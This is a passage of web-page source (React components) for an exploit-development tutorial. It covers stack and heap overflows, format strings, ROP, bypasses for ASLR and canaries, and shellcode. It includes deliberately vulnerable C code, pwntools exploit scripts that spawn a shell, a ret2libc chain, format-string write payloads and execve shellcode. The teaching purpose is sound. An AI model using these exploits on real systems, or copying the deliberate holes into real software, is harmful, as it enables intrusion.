                  <li><strong>Security Research:</strong> Discover and responsibly disclose vulnerabilities</li>
                  <li><strong>Penetration Testing:</strong> Validate security controls by demonstrating exploitation</li>
                  <li><strong>CTF Competitions:</strong> Binary exploitation is a core category in capture-the-flag events</li>
                  <li><strong>Defensive Understanding:</strong> Know how attacks work to build better defenses</li>
                  <li><strong>Career Growth:</strong> Exploit developers are highly sought after in security</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                The Exploitation Process
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap" }}>
{`1. Reconnaissance     → Understand the target binary/application
2. Vulnerability ID   → Find bugs (fuzzing, code review, RE)
3. Root Cause         → Understand WHY the bug is exploitable
4. Exploitation Plan  → Determine attack vector and payload
5. Exploit Dev        → Build working proof-of-concept
6. Reliability        → Make exploit work consistently
7. Weaponization      → (For authorized testing only)`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Prerequisites for This Guide
              </Typography>
              <Typography variant="body2">
                • Basic understanding of C/C++ programming<br/>
                • Familiarity with assembly language (x86/x64)<br/>
                • Command line comfort (Linux preferred)<br/>
                • Understanding of how programs execute<br/>
                • Patience and persistence—exploitation is challenging!
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Memory Layout */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="memory-layout" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <MemoryIcon sx={{ color: "#f87171" }} /> Memory Layout & Architecture
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Understanding how memory is organized is fundamental to exploit development. Every process has a
              virtual address space divided into distinct regions.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Process Memory Layout (Linux x86-64)
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`High Addresses (0x7fff...)
┌─────────────────────────┐
│    Kernel Space         │  ← Not accessible to userland
├─────────────────────────┤
│    Stack                │  ← Grows DOWN (toward lower addresses)
│    ↓ ↓ ↓ ↓ ↓           │    Local vars, return addresses, args
├─────────────────────────┤
│                         │
│    (unmapped)           │  ← Guard pages, unused space
│                         │
├─────────────────────────┤
│    ↑ ↑ ↑ ↑ ↑           │
│    Heap                 │  ← Grows UP (toward higher addresses)
│                         │    Dynamic allocations (malloc)
├─────────────────────────┤
│    .bss                 │  ← Uninitialized global/static vars
├─────────────────────────┤
│    .data                │  ← Initialized global/static vars
├─────────────────────────┤
│    .rodata              │  ← Read-only data (strings, constants)
├─────────────────────────┤
│    .text                │  ← Executable code
└─────────────────────────┘
Low Addresses (0x400000...)`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Key CPU Registers (x86-64)
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`General Purpose:
  RAX  → Return value, accumulator
  RBX  → Base register (callee-saved)
  RCX  → Counter, 4th argument (Windows)
  RDX  → Data, 3rd argument
  RSI  → Source index, 2nd argument (Linux)
  RDI  → Destination, 1st argument (Linux)
  R8-R15 → Additional registers

Special Purpose:
  RSP  → Stack Pointer (top of stack)
  RBP  → Base Pointer (stack frame base)
  RIP  → Instruction Pointer (next instruction)

Flags:
  RFLAGS → Status flags (zero, carry, sign, etc.)`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Stack Frame Structure
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`When a function is called:

High Address
┌─────────────────────────┐
│  Function Arguments     │  ← Passed on stack (x86) or registers
├─────────────────────────┤
│  Return Address         │  ← Where to return after function
├─────────────────────────┤  ← Old RBP points here
│  Saved RBP              │  ← Previous frame pointer
├─────────────────────────┤  ← Current RBP points here
│  Local Variable 1       │
│  Local Variable 2       │
│  ...                    │
├─────────────────────────┤  ← Current RSP points here
│  (more stack growth)    │
└─────────────────────────┘
Low Address

Buffer overflows exploit this by overwriting
the Return Address with attacker-controlled value!`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Endianness: Little-Endian
              </Typography>
              <Typography variant="body2">
                x86/x64 uses little-endian byte order. The value <code>0xDEADBEEF</code> is stored in memory as:
                <br/><code>EF BE AD DE</code> (least significant byte first)
                <br/><br/>
                This is crucial when crafting exploits—addresses must be written in reverse byte order!
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Stack Overflows */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="stack-overflow" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <LayersIcon sx={{ color: "#f87171" }} /> Stack-Based Buffer Overflows
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Stack buffer overflows are the classic entry point into exploit development. They occur when
              data written to a stack buffer exceeds its allocated size, overwriting adjacent memory.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Vulnerable Code Example
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];       // Only 64 bytes allocated
    strcpy(buffer, input); // No bounds checking!
    printf("You entered: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}

// Compile with protections disabled for learning:
// gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Exploitation Steps
              </Typography>
              <Typography variant="body2" component="div">
                <ol style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>Find the crash:</strong> Send long input to cause a segmentation fault</li>
                  <li><strong>Determine offset:</strong> Find exact bytes needed to reach return address</li>
                  <li><strong>Control EIP/RIP:</strong> Verify you can set the instruction pointer</li>
                  <li><strong>Find bad characters:</strong> Identify bytes that break your payload</li>
                  <li><strong>Choose attack vector:</strong> Shellcode, ret2libc, ROP, etc.</li>
                  <li><strong>Build payload:</strong> Padding + Return Address + Shellcode/ROP chain</li>
                  <li><strong>Test and refine:</strong> Debug and adjust until exploit works</li>
                </ol>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Finding the Offset with Pattern
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Using Metasploit pattern tools:
$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...

# Run program with pattern, note crash address
$ gdb ./vuln
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2...
# Program crashes, EIP = 0x41366241

# Find offset
$ msf-pattern_offset -l 100 -q 0x41366241
Exact match at offset 72

# Or use pwntools:
from pwn import *
cyclic(100)           # Generate pattern
cyclic_find(0x6261)   # Find offset`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Basic Exploit Structure
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`from pwn import *

# Target binary
elf = context.binary = ELF('./vuln')

# Configuration
offset = 72
ret_address = p64(0x7fffffffe000)  # Address of shellcode

# Shellcode (execve /bin/sh)
shellcode = asm(shellcraft.sh())

# Build payload
payload = b'A' * offset          # Padding to reach return addr
payload += ret_address           # Overwrite return address
payload += b'\\x90' * 16          # NOP sled
payload += shellcode             # Shellcode

# Send exploit
p = process('./vuln')
p.sendline(payload)
p.interactive()`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Common Pitfalls
              </Typography>
              <Typography variant="body2">
                • <strong>Bad characters:</strong> Null bytes (0x00), newlines (0x0a), carriage returns (0x0d)<br/>
                • <strong>Stack alignment:</strong> x86-64 requires 16-byte alignment before function calls<br/>
                • <strong>Address randomization:</strong> ASLR changes addresses each run<br/>
                • <strong>Protections:</strong> Stack canaries, NX/DEP will block simple exploits
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Heap Exploitation */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="heap-exploitation" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <StorageIcon sx={{ color: "#f87171" }} /> Heap Exploitation
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Heap exploitation targets dynamically allocated memory. It's more complex than stack exploitation
              but often bypasses stack-based protections. Understanding the heap allocator is crucial.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Glibc Heap Chunk Structure
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`Allocated Chunk:
┌─────────────────────────┐
│  prev_size (if prev free)│  8 bytes
├─────────────────────────┤
│  size | flags           │  8 bytes (includes A,M,P bits)
├─────────────────────────┤
│                         │
│  User Data              │  ← Pointer returned by malloc
│                         │
└─────────────────────────┘

Freed Chunk (in bins):
┌─────────────────────────┐
│  prev_size              │
├─────────────────────────┤
│  size | flags           │
├─────────────────────────┤
│  fd (forward pointer)   │  ← Points to next free chunk
├─────────────────────────┤
│  bk (backward pointer)  │  ← Points to previous free chunk
├─────────────────────────┤
│  (rest of chunk)        │
└─────────────────────────┘`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Heap Bins Overview
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>Tcache (Thread Cache):</strong> Per-thread cache for small chunks (≤0x408). LIFO, minimal checks.</li>
                  <li><strong>Fastbins:</strong> Single-linked list for small chunks (≤0x80). LIFO, no coalescing.</li>
                  <li><strong>Unsorted Bin:</strong> Temporary holding area for freed chunks before sorting.</li>
                  <li><strong>Small Bins:</strong> Doubly-linked lists for chunks &lt; 512 bytes. FIFO.</li>
                  <li><strong>Large Bins:</strong> Doubly-linked lists for chunks ≥ 512 bytes. Sorted by size.</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Common Heap Vulnerabilities
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`1. Use-After-Free (UAF)
   char *ptr = malloc(64);
   free(ptr);
   // ptr is now dangling
   ptr[0] = 'A';  // Writing to freed memory!

2. Double Free
   char *ptr = malloc(64);
   free(ptr);
   free(ptr);  // Freeing same pointer twice!

3. Heap Overflow
   char *ptr = malloc(32);
   strcpy(ptr, very_long_string);  // Overflows into next chunk

4. Null Byte Overflow (Off-by-One)
   char *ptr = malloc(32);
   ptr[32] = '\\0';  // Overwrites size field of next chunk`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Tcache Poisoning Attack
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Tcache poisoning: corrupt fd pointer to get arbitrary allocation

# 1. Allocate two chunks
a = malloc(0x20)
b = malloc(0x20)

# 2. Free them (both go to tcache)
free(a)  # tcache[0x30]: a -> NULL
free(b)  # tcache[0x30]: b -> a -> NULL

# 3. Overwrite b's fd pointer (via UAF or overflow)
# Change: b -> a  to  b -> __free_hook
b->fd = &__free_hook

# 4. Allocate twice
malloc(0x20)  # Returns b
malloc(0x20)  # Returns __free_hook address!

# 5. Write to __free_hook, call free() to get code execution`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#a855f7", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                "House of" Techniques
              </Typography>
              <Typography variant="body2">
                • <strong>House of Force:</strong> Corrupt top chunk size for arbitrary allocation<br/>
                • <strong>House of Spirit:</strong> Free fake chunk to get allocation at target<br/>
                • <strong>House of Lore:</strong> Corrupt small bin fd/bk pointers<br/>
                • <strong>House of Orange:</strong> Corrupt top chunk to trigger malloc_printerr<br/>
                • <strong>House of Einherjar:</strong> Off-by-null to overlap chunks
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Format Strings */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="format-strings" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <CodeIcon sx={{ color: "#f87171" }} /> Format String Vulnerabilities
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Format string vulnerabilities occur when user input is passed directly as the format string
              to printf-family functions. This allows reading from and writing to arbitrary memory.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Vulnerable vs Safe Code
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`// VULNERABLE - user input as format string
char *user_input = get_input();
printf(user_input);  // DANGER!

// SAFE - user input as argument
char *user_input = get_input();
printf("%s", user_input);  // Safe`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Format Specifiers for Exploitation
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`%x    → Read stack values (hex)
%s    → Read string at address on stack
%n    → WRITE number of chars printed to address on stack
%p    → Print pointer (like %x but with 0x prefix)

Direct Parameter Access:
%7$x  → Read 7th parameter from stack
%7$n  → Write to address at 7th parameter

Width Specifiers:
%100x → Print at least 100 characters
%hn   → Write short (2 bytes) instead of int
%hhn  → Write single byte`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Reading Memory (Information Leak)
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Leak stack values
$ ./vuln "AAAA%08x.%08x.%08x.%08x"
AAAA00000001.f7ffd000.41414141.38302541

# The 41414141 is our "AAAA" - we found the offset!

# Leak specific addresses (need to find offset first)
# If our input is at offset 7:
$ ./vuln "$(printf '\\x10\\x40\\x00\\x00')%7$s"
# Reads string at address 0x00400010`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Writing Memory with %n
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# %n writes the count of characters printed so far
# To write value 0x41 (65) to address at offset 7:
$ ./vuln "$(printf '\\x10\\x40\\x00\\x00')%61x%7$n"
#         ↑ address (4 bytes) + 61 chars = 65 total

# For larger values, write byte-by-byte with %hhn:
# Write 0xdeadbeef to address:
# - Write 0xef to addr+0
# - Write 0xbe to addr+1
# - Write 0xad to addr+2
# - Write 0xde to addr+3

# Pwntools makes this easy:
from pwn import *
payload = fmtstr_payload(offset, {target_addr: value})`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Common Targets for Format String Writes
              </Typography>
              <Typography variant="body2">
                • <strong>GOT entries:</strong> Redirect function calls to shellcode/libc<br/>
                • <strong>Return addresses:</strong> Hijack control flow when function returns<br/>
                • <strong>__malloc_hook / __free_hook:</strong> Called on malloc/free (older glibc)<br/>
                • <strong>Stack canary:</strong> Leak it first, then include in overflow payload<br/>
                • <strong>.fini_array:</strong> Destructors called at program exit
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Return-Oriented Programming */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="rop" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <SettingsIcon sx={{ color: "#f87171" }} /> Return-Oriented Programming (ROP)
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              ROP is a technique that bypasses NX/DEP by chaining together small instruction sequences
              (gadgets) already present in the binary. Instead of injecting code, you reuse existing code.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                How ROP Works
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`ROP Chain Execution:

┌─────────────────┐
│  gadget1 addr   │ ← RSP points here after overflow
├─────────────────┤     gadget1: pop rdi; ret
│  arg for rdi    │
├─────────────────┤
│  gadget2 addr   │     gadget2: pop rsi; ret
├─────────────────┤
│  arg for rsi    │
├─────────────────┤
│  function addr  │     e.g., system()
└─────────────────┘

Each 'ret' pops next address from stack, continuing chain.`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Finding Gadgets
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Using ROPgadget
$ ROPgadget --binary ./vuln
Gadgets information
============================================================
0x0000000000401234 : pop rdi ; ret
0x0000000000401236 : pop rsi ; pop r15 ; ret
0x0000000000401238 : ret

# Using ropper
$ ropper --file ./vuln --search "pop rdi"

# Using pwntools
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Basic ROP Chain: ret2libc
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`from pwn import *

elf = context.binary = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# Leak libc address (via puts or printf)
# ... (leak code here) ...
libc.address = leaked_addr - libc.symbols['puts']

# Build ROP chain
rop = ROP([elf, libc])
rop.call('system', [next(libc.search(b'/bin/sh'))])

# Or manually:
pop_rdi = 0x401234  # pop rdi; ret gadget
ret = 0x401235      # ret gadget (for alignment)
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

payload = b'A' * offset
payload += p64(ret)       # Stack alignment
payload += p64(pop_rdi)   # Set RDI to /bin/sh
payload += p64(bin_sh)
payload += p64(system)    # Call system("/bin/sh")`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#0ea5e9", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Advanced ROP Techniques
              </Typography>
              <Typography variant="body2">
                • <strong>ret2csu:</strong> Use __libc_csu_init gadgets to control multiple registers<br/>
                • <strong>SROP:</strong> Use sigreturn syscall to set all registers from fake frame<br/>
                • <strong>ret2dlresolve:</strong> Trick dynamic linker to resolve arbitrary symbols<br/>
                • <strong>Stack pivot:</strong> Move RSP to controlled memory for larger chains<br/>
                • <strong>JOP/COP:</strong> Jump/Call-oriented variants for bypassing ROP defenses
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Bypassing Protections */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="bypass-techniques" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <SecurityIcon sx={{ color: "#f87171" }} /> Bypassing Security Protections
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Modern systems employ multiple layers of protection. Understanding each protection and its
              weaknesses is essential for successful exploitation.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Protection Overview
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`Protection        Purpose                    Bypass Technique
─────────────────────────────────────────────────────────────
NX/DEP           No execute on data         ROP, ret2libc, JOP
ASLR             Randomize addresses        Info leak, brute force
Stack Canary     Detect stack overflow      Leak canary, format string
PIE              Randomize code base        Leak code address
RELRO (Full)     Read-only GOT              Target other structures
Fortify Source   Check buffer bounds        Find unchecked functions
CFI              Control flow integrity     Gadget-based attacks`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Bypassing ASLR
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>Information leak:</strong> Leak a pointer, calculate base addresses</li>
                  <li><strong>Partial overwrite:</strong> Overwrite only lower bytes (often not randomized)</li>
                  <li><strong>Brute force:</strong> On 32-bit, only 256-65536 possibilities for some regions</li>
                  <li><strong>Return-to-plt:</strong> PLT addresses not randomized without PIE</li>
                  <li><strong>Format string:</strong> Leak stack/heap/libc pointers</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Bypassing Stack Canaries
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`# Stack canaries are random values placed before return address

Stack with canary:
┌─────────────────┐
│  Return Address │
├─────────────────┤
│  Saved RBP      │
├─────────────────┤
│  CANARY VALUE   │  ← If modified, program aborts
├─────────────────┤
│  Local Buffer   │
└─────────────────┘

Bypass methods:
1. Leak canary via format string: %17$p (example offset)
2. Leak canary via buffer over-read
3. Brute force (fork servers - canary same in child)
4. Overwrite data/pointers below canary`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Checking Binary Protections
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.85rem" }}>
{`$ checksec ./binary
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

# pwntools equivalent:
from pwn import *
elf = ELF('./binary')
print(elf.checksec())`}
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Shellcode Development */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="shellcode" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <TerminalIcon sx={{ color: "#f87171" }} /> Shellcode Development
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Shellcode is position-independent machine code designed to be injected and executed.
              Writing effective shellcode requires understanding assembly and avoiding bad characters.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Basic Linux x64 Shellcode (execve)
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`; execve("/bin/sh", NULL, NULL)
; syscall number for execve: 59 (0x3b)

section .text
global _start

_start:
    xor rsi, rsi        ; rsi = NULL (argv)
    xor rdx, rdx        ; rdx = NULL (envp)

    ; Push "/bin/sh" onto stack
    xor rax, rax
    push rax            ; null terminator
    mov rdi, 0x68732f6e69622f  ; "/bin/sh" in little-endian
    push rdi
    mov rdi, rsp        ; rdi = pointer to "/bin/sh"

    mov al, 59          ; syscall number (execve)
    syscall

; Compile: nasm -f elf64 shell.asm && ld shell.o -o shell
; Extract bytes: objdump -d shell | grep -Po '\\s\\K[a-f0-9]{2}(?=\\s)' | tr -d '\\n'`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Avoiding Bad Characters
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>Null bytes (0x00):</strong> Use xor reg, reg instead of mov reg, 0</li>
                  <li><strong>Newlines (0x0a, 0x0d):</strong> Avoid instructions containing these bytes</li>
                  <li><strong>Spaces (0x20):</strong> Use alternative encodings</li>
                  <li><strong>Technique:</strong> XOR-encode entire shellcode with a key, prepend decoder stub</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Using Pwntools for Shellcode
              </Typography>
              <Typography variant="body2" sx={{ fontFamily: "monospace", whiteSpace: "pre-wrap", fontSize: "0.8rem" }}>
{`from pwn import *

# Set architecture
